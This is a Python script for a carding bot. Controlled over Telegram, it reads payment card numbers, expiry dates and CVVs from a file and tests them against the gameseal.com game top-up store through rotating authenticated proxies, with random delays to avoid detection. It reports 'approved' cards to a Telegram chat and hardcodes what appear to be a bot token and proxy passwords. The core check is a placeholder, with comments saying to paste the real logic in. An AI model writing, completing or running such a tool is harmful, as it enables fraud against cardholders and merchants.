import requests
import re
import json
import random
import string
import time
import uuid
from urllib.parse import urljoin
from threading import Thread

# ========================= CONFIG =========================
BASE = "https://gameseal.com"
PRODUCT_SLUG = "pubg-mobile-60-uc-unknown-cash-direct-top-up-global"
PRODUCT_ID = "019bd77df6647139b46f487ba5a59509"
PUBG_ID = "51458699098"

TELEGRAM_BOT_TOKEN = "8783810252:AAGz0ajTiib4Pg1k27RPT5GaRLs974HBIKM"
TELEGRAM_CHAT_ID = "-5124898287"

# ========================= PROXIES =========================
PROXIES_LIST = [
    "196.244.48.124:12345:naveed:Qwerty_123ABC",
    "p102.squidproxies.com:9093:1352:23CfS1Bz7oF0"
]

def get_random_proxy():
    proxy = random.choice(PROXIES_LIST)
    if ":" in proxy and "@" not in proxy:
        parts = proxy.split(":")
        if len(parts) == 4:
            ip, port, user, pw = parts
            proxy_url = f"http://{user}:{pw}@{ip}:{port}"
            return {"http": proxy_url, "https": proxy_url}
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"}


# ========================= TELEGRAM =========================
def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
        requests.post(url, json=data, timeout=15)
    except:
        pass


# ========================= HELPERS =========================
def parse_card(cc_str):
    parts = cc_str.strip().split("|")
    if len(parts) != 4: return None
    number, month, year, cvv = parts
    month = month.strip().zfill(2)
    year = year.strip()
    if len(year) == 2: year = "20" + year
    return {"number": number.strip(), "month": month, "year": year, "cvv": cvv.strip()}


# ========================= MASS CHECK (Only Approved) =========================
def mass_check(chat_id):
    send_to_telegram("🚀 <b>Mass Check Started with Proxies</b>\nOnly <b>Approved</b> cards will be sent!")

    try:
        with open("cc.txt", "r", encoding="utf-8") as f:
            cards = f.readlines()
    except:
        send_to_telegram("❌ cc.txt file nahi mili!")
        return

    total = len([c for c in cards if "|" in c])
    approved = 0

    for i, line in enumerate(cards, 1):
        line = line.strip()
        if not line or "|" not in line: continue

        card = parse_card(line)
        if not card: continue

        result = check_card(card)
        status = result.get("status", "").upper()

        if status in ["CHARGED", "APPROVED", "PAYMENT_ACCEPTED", "SUCCESS"]:
            approved += 1
            cc_short = card["number"][:6] + "xxxxxx" + card["number"][-4:]
            
            msg = f"""
✅ <b>APPROVED HIT!</b> #{i}

<b>Card:</b> <code>{cc_short}</code>
<b>Status:</b> <b>{status}</b>
<b>Price:</b> {result.get('price', '0.82 EUR')}
            """
            send_to_telegram(msg)

        time.sleep(random.randint(7, 12))  # Random delay

    send_to_telegram(f"✅ <b>Mass Check Finished!</b>\nTotal: {total} | Hits: {approved}")


# ========================= MAIN CHECK CARD =========================
def check_card(card):
    proxy = get_random_proxy()
    
    sess = requests.Session()
    sess.proxies.update(proxy)
    
    sess.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
        "Accept-Language": "en-US,en;q=0.9",
    })

    cc = card["number"]
    exp = f"{card['month'].zfill(2)}{card['year'][-2:]}"
    cc_short = cc[:6] + "xxxxxx" + cc[-4:]

    try:
        # =================== YAHAN PURA CHECK LOGIC DAAL DO ===================
        # Abhi test ke liye placeholder (real logic paste kar dena)
        time.sleep(4)
        
        result = {
            "status": "DECLINED",   # Change to "CHARGED" for testing approved
            "price": "0.82 EUR",
            "message": "Proxy Test"
        }

        return result

    except Exception as e:
        return {"status": "ERROR", "message": str(e)}


# ========================= TELEGRAM BOT =========================
def telegram_bot():
    offset = 0
    send_to_telegram("✅ <b>GameSeal Bot Started with Proxies!</b>\nOnly Approved Cards Sent\n\nCommand: /mchk")

    while True:
        try:
            resp = requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?offset={offset}&timeout=30")
            data = resp.json()

            for update in data.get("result", []):
                offset = update["update_id"] + 1
                msg = update.get("message")
                if not msg: continue

                chat_id = msg["chat"]["id"]
                text = msg.get("text", "").strip()

                if text == "/mchk":
                    Thread(target=mass_check, args=(chat_id,), daemon=True).start()

                elif text == "/start":
                    send_to_telegram("👋 <b>GameSeal Proxy Bot Active</b>\n/mchk → Start Mass Check")

        except:
            time.sleep(5)


if __name__ == "__main__":
    print("GameSeal Bot with Proxy Rotation Started...")
    print("Proxies Loaded:", len(PROXIES_LIST))
    telegram_bot()
